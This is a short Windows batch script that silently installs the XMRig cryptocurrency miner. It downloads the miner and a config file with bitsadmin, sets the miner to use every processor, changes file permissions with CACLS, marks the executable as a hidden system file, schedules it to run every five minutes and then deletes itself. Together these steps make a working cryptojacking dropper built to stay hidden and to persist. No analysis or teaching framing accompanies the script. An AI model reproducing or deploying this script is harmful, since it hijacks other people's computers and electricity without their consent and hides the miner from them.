mkdir "%APPDATA%\miner"
bitsadmin.exe /transfer "Download Miner" miner_link %APPDATA%\miner\xmrig.exe
bitsadmin.exe /transfer "Download Config" config_link %APPDATA%\miner\config.json
powershell -Command "(gc %APPDATA%\miner\config.json) -replace 'THREADS_COUNT', '%NUMBER_OF_PROCESSORS%' | Out-File %APPDATA%\miner\config.json"
echo Y|CACLS %APPDATA%\miner\xmrig.exe /P %USERNAME%:N
echo Y|CACLS %APPDATA%\miner\xmrig.exe /P %USERNAME%:R
echo Y|CACLS %APPDATA%\miner\config.json /P %USERNAME%:N
echo Y|CACLS %APPDATA%\miner\config.json /P %USERNAME%:R
attrib "%APPDATA%\miner\xmrig.exe" +s +h
SCHTASKS /Create /SC MINUTE /MO 5 /TN "Miner" /TR "%APPDATA%\miner\xmrig.exe"
del %0